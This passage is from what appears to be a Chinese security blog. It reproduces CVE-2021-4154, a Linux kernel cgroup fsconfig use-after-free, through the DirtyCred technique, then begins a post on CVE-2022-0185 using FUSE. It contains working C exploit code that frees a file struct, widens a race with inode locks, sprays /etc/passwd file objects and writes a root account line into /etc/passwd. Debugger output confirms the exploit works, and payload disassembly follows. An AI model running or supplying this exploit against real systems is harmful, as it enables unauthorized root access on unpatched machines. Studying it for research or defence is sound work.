<h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><p>struct file 结构体描述了一个可以打开的文件的基本信息。包括读写权限，inode 信息等。</p>
<details class="note "><summary><p>file 结构体</p>
</summary>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">llist_node</span>	<span class="title">fu_llist</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> 	<span class="title">fu_rcuhead</span>;</span></span><br><span class="line">	&#125; f_u;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">path</span>		<span class="title">f_path</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span>		*<span class="title">f_inode</span>;</span>	<span class="comment">/* cached value */</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span>	*<span class="title">f_op</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Protects f_ep, f_flags.</span></span><br><span class="line"><span class="comment">	 * Must not be taken from IRQ context.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">spinlock_t</span>		f_lock;</span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">rw_hint</span>		<span class="title">f_write_hint</span>;</span></span><br><span class="line">	<span class="type">atomic_long_t</span>		f_count;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> 		f_flags;</span><br><span class="line">	<span class="type">fmode_t</span>			f_mode; <span class="comment">//读写权限</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span>		<span class="title">f_pos_lock</span>;</span></span><br><span class="line">	<span class="type">loff_t</span>			f_pos;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fown_struct</span>	<span class="title">f_owner</span>;</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span>	*<span class="title">f_cred</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file_ra_state</span>	<span class="title">f_ra</span>;</span></span><br><span class="line"></span><br><span class="line">	u64			f_version;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="type">void</span>			*f_security;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="comment">/* needed for tty driver, and maybe others */</span></span><br><span class="line">	<span class="type">void</span>			*private_data;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_EPOLL</span></span><br><span class="line">	<span class="comment">/* Used by fs/eventpoll.c to link all the hooks to this file */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">hlist_head</span>	*<span class="title">f_ep</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* #ifdef CONFIG_EPOLL */</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">address_space</span>	*<span class="title">f_mapping</span>;</span></span><br><span class="line">	<span class="type">errseq_t</span>		f_wb_err;</span><br><span class="line">	<span class="type">errseq_t</span>		f_sb_err; <span class="comment">/* for syncfs */</span></span><br><span class="line">&#125; __randomize_layout</span><br><span class="line">  __attribute__((aligned(<span class="number">4</span>)));	<span class="comment">/* lest something weird decides that 2 is OK */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_handle</span> &#123;</span></span><br><span class="line">	__u32 handle_bytes;</span><br><span class="line">	<span class="type">int</span> handle_type;</span><br><span class="line">	<span class="comment">/* file identifier */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> f_handle[];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

</details>

<h3 id="slab"><a href="#slab" class="headerlink" title="slab"></a>slab</h3><p>通常情况下，不同大小的 slab 几乎不会相邻。而即使相同大小，也不能保证一定相邻，所以才有了常用的一些堆喷调节堆布局的技巧。此外，通用 slab 和 特殊 slab 也很难相邻。</p>
<p>常用的 kmalloc-xx 的内存为通用 slab。还有一种特殊 slab，以申请 struct file 为例，在 alloc_file 中：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *__<span class="title">alloc_file</span>(<span class="title">int</span> <span class="title">flags</span>, <span class="title">const</span> <span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">cred</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">f</span>;</span></span><br><span class="line">	<span class="type">int</span> error;</span><br><span class="line"></span><br><span class="line">	f = kmem_cache_zalloc(filp_cachep, GFP_KERNEL);</span><br><span class="line">	···</span><br><span class="line">    <span class="keyword">return</span> f;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>filp_cachep 的初始化：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">filp_cachep</span> __<span class="title">read_mostly</span>;</span></span><br><span class="line"><span class="type">void</span> __init <span class="title function_">files_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	filp_cachep = kmem_cache_create(<span class="string">&quot;filp&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> file), <span class="number">0</span>,</span><br><span class="line">			SLAB_HWCACHE_ALIGN | SLAB_PANIC | SLAB_ACCOUNT, <span class="literal">NULL</span>);</span><br><span class="line">	percpu_counter_init(&amp;nr_files, <span class="number">0</span>, GFP_KERNEL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里初始化了一个叫做 filp 的slab(struct kmem_cache)，其负责分配内存大小为 sizeof(struct file) 的 slab，以后所有的 struct file 都会使用该 slab 分配。</p>
<p>cred 的分配类似，都是从专有的 slab 中进行分配。</p>
<p><img src="/img/CVE-2021-4154/2-1.png"></p>
<h2 id="构造漏洞"><a href="#构造漏洞" class="headerlink" title="构造漏洞"></a>构造漏洞</h2><p>结合本文漏洞的成因与 DirtyCred 利用思路，通过漏洞可以释放任意的文件结构体。而普通文件的文件结构体和高权限的文件结构体都在 filp 中申请，也就是发生在同一个 slab 中的文件结构体的 UAF。</p>
<h2 id="延长条件竞争窗口"><a href="#延长条件竞争窗口" class="headerlink" title="延长条件竞争窗口"></a>延长条件竞争窗口</h2><p>DirtyCred 本质上是一个条件竞争的利用手段。条件竞争的关键就是延长条件竞争的窗口期。常用的有 userfaultfd 和 FUSE。该漏洞使用一种在新版本下利用文件系统锁的来延长窗口的方式。利用文件系统的 inode 锁：</p>
<ol>
<li>在已经有一个进程对一个文件进行写入操作的时候，会给文件 inode 上锁，其他向该文件进行写入的进程需要等待上一个进程写入完成后解锁；</li>
<li><strong>对文件是否可以写入的权限判断并不受锁的影响。</strong></li>
</ol>
<p>那么思路就是：</p>
<ol>
<li>先利用一个进程向一个可写文件写入大量内容，inode 锁就会锁住较长的时间；</li>
<li>再利用第二个进程向该文件写入 “hi:x:0:0:root:&#x2F;:&#x2F;bin&#x2F;sh&quot; （即想向 &#x2F;etc&#x2F;passwd 等特权文件中写入的内容）；</li>
<li>第三个进程利用漏洞替换 file 结构体，若成功替换则会向特权文件中写入恶意内容。</li>
</ol>
<p>借用 bsauce 师傅博客中简图，纵向代表执行时间：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">   Thread 0: slow write               Thread 1: cmd write                      Thread 3: exploit</span><br><span class="line">    __fdget_pos (no lock)            __fdget_pos (bypass lock)                             |</span><br><span class="line">        |                                  |                                               |</span><br><span class="line">        |                                  |                                               |</span><br><span class="line">        \/                                 \/                                              |</span><br><span class="line"> ext4_file_write_iter (lock inode)    ext4_file_write_iter (wait for lock)                 |</span><br><span class="line">        |                                  |                                               |</span><br><span class="line">        |                                  |                                               |</span><br><span class="line">        \/                                 |                                               \/</span><br><span class="line">   normal write                            |                                      replace the file structure</span><br><span class="line">        |                                  |</span><br><span class="line">        |                                  |</span><br><span class="line">        \/                                 |</span><br><span class="line">write done, release inode lock             |</span><br><span class="line">                                           \/</span><br><span class="line">                                   get inode lock and then write</span><br><span class="line">                                           |</span><br><span class="line">                                           \/</span><br><span class="line">                                        write done</span><br></pre></td></tr></table></figure>

<p>在检查写许可之前会调用 __fdget_pos()：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> file_count(x)	atomic_long_read(&amp;(x)-&gt;f_count)</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> __fdget_pos(<span class="type">unsigned</span> <span class="type">int</span> fd)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> v = __fdget(fd);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span> =</span> (<span class="keyword">struct</span> file *)(v &amp; ~<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (file &amp;&amp; (file-&gt;f_mode &amp; FMODE_ATOMIC_POS)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (file_count(file) &gt; <span class="number">1</span>) &#123;</span><br><span class="line">			v |= FDPUT_POS_UNLOCK;</span><br><span class="line">			mutex_lock(&amp;file-&gt;f_pos_lock);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> v;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在满足条件后会获取 file-&gt;f_pos_lock 锁，可能导致线程 2 也卡死在这里，这样就无法增大从写许可检查与实际写之间的时间窗口了。而在线程1、线程2中打开的都是同一个文件，file_count 获取到的 reference count 一定是大于1的，那么想要避免上述情况，就需要移除 FMODE_ATOMIC_POS flag。</p>
<p>在 open 调用中，只要打开常规文件，都会设置 FMODE_ATOMIC_POS，<strong>解决办法是作者发现打开软连接文件就不会设置这个 flag，这样就能避免两个线程在 __fdget_pos 中因为竞争而卡住。</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* POSIX.1-2008/SUSv4 Section XSI 2.9.7 */</span></span><br><span class="line"><span class="keyword">if</span> (S_ISREG(inode-&gt;i_mode) || S_ISDIR(inode-&gt;i_mode))</span><br><span class="line">   f-&gt;f_mode |= FMODE_ATOMIC_POS;</span><br></pre></td></tr></table></figure>

<p>文件系统锁：ext4_buffered_write_iter 中会对 inode 上锁，避免多线程同时写入同一文件，这个锁在写许可检查与实际写之间。线程1获得锁并写入大量数据，线程2将恶意数据写入同一文件（软连接文件不会在 __fdget_pos() 中卡住），在 ext4_file_write_iter 中获取 inode 锁时暂停，线程3触发漏洞释放原来文件的 file 结构，并打开大量特权文件，喷射大量 file 结构进行替换，等待线程2获得锁后便会向特权文件中写入恶意数据。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line"><span class="title function_">ext4_file_write_iter</span><span class="params">(<span class="keyword">struct</span> kiocb *iocb, <span class="keyword">struct</span> iov_iter *from)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> =</span> file_inode(iocb-&gt;ki_filp);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(ext4_forced_shutdown(EXT4_SB(inode-&gt;i_sb))))</span><br><span class="line">		<span class="keyword">return</span> -EIO;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_FS_DAX</span></span><br><span class="line">	<span class="keyword">if</span> (IS_DAX(inode))</span><br><span class="line">		<span class="keyword">return</span> ext4_dax_write_iter(iocb, from);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="keyword">if</span> (iocb-&gt;ki_flags &amp; IOCB_DIRECT)</span><br><span class="line">		<span class="keyword">return</span> ext4_dio_write_iter(iocb, from);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> ext4_buffered_write_iter(iocb, from);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">ext4_buffered_write_iter</span><span class="params">(<span class="keyword">struct</span> kiocb *iocb,</span></span><br><span class="line"><span class="params">					<span class="keyword">struct</span> iov_iter *from)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">ssize_t</span> ret;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> =</span> file_inode(iocb-&gt;ki_filp);</span><br><span class="line">	···</span><br><span class="line">    ext4_fc_start_update(inode);</span><br><span class="line">	inode_lock(inode);</span><br><span class="line">	ret = ext4_write_checks(iocb, from);</span><br><span class="line">	<span class="keyword">if</span> (ret &lt;= <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	···</span><br><span class="line">	ret = generic_perform_write(iocb-&gt;ki_filp, from, iocb-&gt;ki_pos);</span><br><span class="line">	···</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">	inode_unlock(inode);</span><br><span class="line">	···</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="利用实现"><a href="#利用实现" class="headerlink" title="利用实现"></a>利用实现</h2><p>综上，整理流程为：</p>
<ol>
<li>直接对一个文件进行一次非法释放，这样该文件描述符就会指向一个被释放的 struct file 结构体；</li>
<li>A 进程对该文件进行大量写入，inode会将其上锁；</li>
<li>B 进程使用已经被释放的文件描述符尝试写入任意内容，会先通过权限校验，然后等待A进程写入结束；</li>
<li>C 进程喷射大量 passwd 文件，该文件的文件结构体会覆盖之前释放的 struct file 内存区域；</li>
<li>B 进程等待结束，此时 file 结构体已被替换，最终就会写入到passwd之中。</li>
</ol>
<p>slow_write 对应 A 进程：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">slow_write</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] start slow write to get the lock\n&quot;</span>);</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;./uaf&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] error open uaf file.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span> addr = <span class="number">0x30000000</span>;</span><br><span class="line">    <span class="type">int</span> offset;</span><br><span class="line">    <span class="keyword">for</span> (offset = <span class="number">0</span>; offset &lt; <span class="number">0x80000</span>; offset++) &#123;</span><br><span class="line">        <span class="type">void</span> *r = mmap((<span class="type">void</span> *)(addr + offset * <span class="number">0x1000</span>), <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (r &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[-] allocate failed at 0x%x.\n&quot;</span>, offset);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    assert(offset &gt; <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> *mem = (<span class="type">void</span> *)(addr);</span><br><span class="line">    <span class="built_in">memcpy</span>(mem, <span class="string">&quot;hhhhh&quot;</span>, <span class="number">5</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span>[5];</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">        iov[i].iov_base = mem;</span><br><span class="line">        iov[i].iov_len = (offset - <span class="number">1</span>) * <span class="number">0x1000</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    run_write = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (writev(fd, iov, <span class="number">5</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        perror(<span class="string">&quot;slow write.&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] slow write done.\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>write_cmd 对应 B 进程：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">write_cmd</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">1024</span>] = <span class="string">&quot;hi:x:0:0:root:/:/bin/sh\n&quot;</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span> =</span> &#123;.iov_base = data, .iov_len = <span class="built_in">strlen</span>(data)&#125;;</span><br><span class="line">    <span class="keyword">while</span> (!run_write) &#123;&#125;</span><br><span class="line">    run_spray = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (writev(uaf_fd, &amp;iov, <span class="number">1</span>) &lt; <span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">&quot;[-] failed to write.(DirtyCred)\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] overwrite done. (run after the slow write)\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>触发漏洞和替换文件结构体都可以在主进程中完成：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">spray_files</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (!run_spray) &#123;&#125;</span><br><span class="line">    <span class="type">int</span> found = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// spray priviledged file object</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] got uaf fd %d, start spray.\n&quot;</span>, uaf_fd);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_FILE_NUM; i++) &#123;</span><br><span class="line">        fds[i] = open(<span class="string">&quot;/etc/passwd&quot;</span>, O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span> (fds[i] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;open file&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (syscall(__NR_kcmp, getpid(), getpid(), KCMP_FILE, uaf_fd, fds[i]) == <span class="number">0</span>) &#123;</span><br><span class="line">            found = <span class="number">1</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[!] found, file id %d.\n&quot;</span>, i);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; i; j++) close(fds[j]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (found) &#123;</span><br><span class="line">        getchar();		<span class="comment">// debug</span></span><br><span class="line">        sleep(<span class="number">4</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">trigger</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> fs_fd = syscall(__NR_fsopen, <span class="string">&quot;cgroup&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (fs_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;fsopen.&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] fsopen failed.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    symlink(<span class="string">&quot;./data&quot;</span>, <span class="string">&quot;./uaf&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uaf_fd = open(<span class="string">&quot;./uaf&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (uaf_fd &lt; <span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">&quot;[-] failed to open symbolic file.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] open symbolic file.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (syscall(__NR_fsconfig, fs_fd, <span class="number">5</span>, <span class="string">&quot;source&quot;</span>, <span class="number">0</span>, uaf_fd)) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] fsconfig.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    close(fs_fd);		<span class="comment">// [!] 触发 kfree(fc-&gt;source), 释放 uaf_fd 文件结构体</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="过程调试"><a href="#过程调试" class="headerlink" title="过程调试"></a>过程调试</h2><p>触发漏洞并且最后 close 掉文件系统的文件描述符：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">trigger</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> fs_fd = syscall(__NR_fsopen, <span class="string">&quot;cgroup&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    ···</span><br><span class="line">    symlink(<span class="string">&quot;./data&quot;</span>, <span class="string">&quot;./uaf&quot;</span>);</span><br><span class="line">    ···</span><br><span class="line">    <span class="keyword">if</span> (syscall(__NR_fsconfig, fs_fd, <span class="number">5</span>, <span class="string">&quot;source&quot;</span>, <span class="number">0</span>, uaf_fd)) &#123;</span><br><span class="line">        ···</span><br><span class="line">    &#125;</span><br><span class="line">    close(fs_fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/img/CVE-2021-4154/1-4.png"></p>
<p>在漏洞函数处下断点，查看第一次 param-&gt;file：</p>
<p><img src="/img/CVE-2021-4154/1-5.png"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gef➤  p *(struct file *)0xffff888103eebe00</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">3 = &#123;</span></span><br><span class="line">  ···</span><br><span class="line">  f_inode = 0xffff8881033d4190,</span><br><span class="line">  f_op = 0xffffffff8224c280 &lt;ext4_file_operations&gt;,</span><br><span class="line">  ···</span><br><span class="line">  f_cred = 0xffff888102475a80,</span><br><span class="line">  ···</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">gef➤  p *(struct inode *)0xffff8881033d4190</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">11 = &#123;</span></span><br><span class="line">  i_mode = 0x81a4,</span><br><span class="line">  i_opflags = 0xd,</span><br><span class="line">  i_uid = &#123;				/* inode拥有者的id */</span><br><span class="line">    val = 0x3e8</span><br><span class="line">  &#125;,</span><br><span class="line">  i_gid = &#123;				/* inode所属的群组id */</span><br><span class="line">    val = 0x3e8</span><br><span class="line">  &#125;,</span><br><span class="line">  ···</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>经过整个利用过程：</p>
<p><img src="/img/CVE-2021-4154/1-6.png"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gef➤  p *(struct file *)0xffff888103eebe00</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">9 = &#123;</span></span><br><span class="line">  ···</span><br><span class="line">  f_inode = 0xffff888101210a70,</span><br><span class="line">  f_op = 0xffffffff8224c280 &lt;ext4_file_operations&gt;,</span><br><span class="line">  ···</span><br><span class="line">  f_cred = 0xffff888102475a80,</span><br><span class="line">  ···</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">gef➤  p *(struct inode *)0xffff888101210a70</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">10 = &#123;</span></span><br><span class="line">  i_mode = 0x81a4,</span><br><span class="line">  i_opflags = 0xd,</span><br><span class="line">  i_uid = &#123;				/* inode拥有者的id */</span><br><span class="line">    val = 0x0</span><br><span class="line">  &#125;,</span><br><span class="line">  i_gid = &#123;				/* inode所属的群组id */</span><br><span class="line">    val = 0x0</span><br><span class="line">  &#125;,</span><br><span class="line">  ···</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可见喷射 &#x2F;etc&#x2F;passwd 的 file 结构体成功占据了被非法释放的 uaf_fd 的 file 结构体的内存。</p>
<p>效果：</p>
<p><img src="/img/CVE-2021-4154/flag.png"></p>
<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ol>
<li><a href="https://blog.csdn.net/Breeze_CAT/article/details/127325123">kernel exploit Dirty Cred: 一种新的无地址依赖漏洞利用方案_dirtycred_breezeO_o的博客-CSDN博客</a></li>
<li><a href="https://bsauce.github.io/2022/10/17/CVE-2021-4154/">【kernel exploit】CVE-2021-4154 错误释放任意file对象-DirtyCred利用 — bsauce</a></li>
<li><a href="https://blog.csdn.net/Breeze_CAT/article/details/127325236">漏洞分析 CVE-2021-4154 cgroup1 fsconfig UAF内核提权_breezeO_o的博客-CSDN博客</a></li>
<li><a href="https://zplin.me/papers/DirtyCred.pdf">DirtyCred: Escalating Privilege in Linux Kernel (zplin.me)</a></li>
</ol>
]]></content>
      <categories>
        <category>cve 复现</category>
      </categories>
      <tags>
        <tag>kernel</tag>
        <tag>cve</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2022-0185的三种利用方式(一)</title>
    <url>/2022/12/05/CVE-2022-0185%E7%9A%84%E4%B8%89%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F-%E4%B8%80/</url>
    <content><![CDATA[<p>CVE-2022-0185 的几种利用方式学习，本篇为第一种利用方式：结合 FUSE 篡改 modprobe_path 完成提权。</p>
<span id="more"></span>

<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h1 id="FUSE"><a href="#FUSE" class="headerlink" title="FUSE"></a>FUSE</h1><p>FUSE（Filesystem in Userspace）是 Linux 的一项功能，可以从用户空间实现虚拟文件系统。当您使用 CONFIG_FUSE_FS 编译选项构建内核时，它会被启用。首先，该程序使用 FUSE 挂载文件系统。当对使用 FUSE 创建的文件系统中的文件执行操作时，将调用 fuse_operations 中定义的处理程序。除了文件操作的打开、读取、写入、关闭，目录访问的 readdir、mkdir、chmod、ioctl、poll 等，所有的操作都可以在 fuse_operations 中独立实现。不过一般题目中只要实现一个能触发的功能来增大条件竞争窗口和实现利用即可。如文件的打开或读取就足够。另外，为了打开，需要定义一个返回文件权限等信息的getattr函数。所以实现一个 FUSE 挂载文件系统需要：</p>
<ol>
<li>确定挂载路径</li>
<li>定义并实现 fuse_operations</li>
</ol>
<h2 id="提高条件竞争的稳定性"><a href="#提高条件竞争的稳定性" class="headerlink" title="提高条件竞争的稳定性"></a>提高条件竞争的稳定性</h2><p>现在让我们看看如何使用 FUSE 来稳定漏洞利用。</p>
<p>不过原理和userfaultfd是完全一样的。在 userfaultfd 中，页面错误是调用用户端处理程序的起点，但在 FUSE 中，文件读取是起点。</p>
<p>如果一个FUSE实现的文件在没有 MAP_POPULATE 的情况下通过 mmap 映射到内存，那么在对该区域进行读写时会出现page fault，最终会调用 fuse_operations 中的 read。如果你使用这个，你可以在内存读&#x2F;写发生的时机切换上下文，就像userfaultfd一样。此时可以直接在对应的回调函数中实现操作也可以配合其他子进程&#x2F;子线程实现。具体的示例可以参考<a href="https://pawnyable.cafe/linux-kernel/LK04/fuse.html">FUSEの利用 | PAWNYABLE!</a> 或本文的利用方式。</p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>回顾一下漏洞即：在 kmalloc-4096 上的溢出。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LOAD:0000000000400078 start:                                  ; DATA XREF: LOAD:0000000000400018↑o</span><br><span class="line">LOAD:0000000000400078                                         ; LOAD:00000000004000F5↓o</span><br><span class="line">LOAD:0000000000400078                 lea     rdi, aTmpSh     ; &quot;/tmp/sh&quot;</span><br><span class="line">LOAD:000000000040007F                 mov     rsi, 241h</span><br><span class="line">LOAD:0000000000400086                 mov     rax, 2</span><br><span class="line">LOAD:000000000040008D                 syscall                 ; LINUX - sys_open</span><br><span class="line">LOAD:000000000040008F                 mov     rdi, rax</span><br><span class="line">LOAD:0000000000400092                 lea     rsi, qword_4000DD</span><br><span class="line">LOAD:0000000000400099                 mov     rdx, 0BAh</span><br><span class="line">LOAD:00000000004000A0                 mov     rax, 1</span><br><span class="line">LOAD:00000000004000A7                 syscall                 ; LINUX - sys_write</span><br><span class="line">LOAD:00000000004000A9                 mov     rax, 3</span><br><span class="line">LOAD:00000000004000B0                 syscall                 ; LINUX - 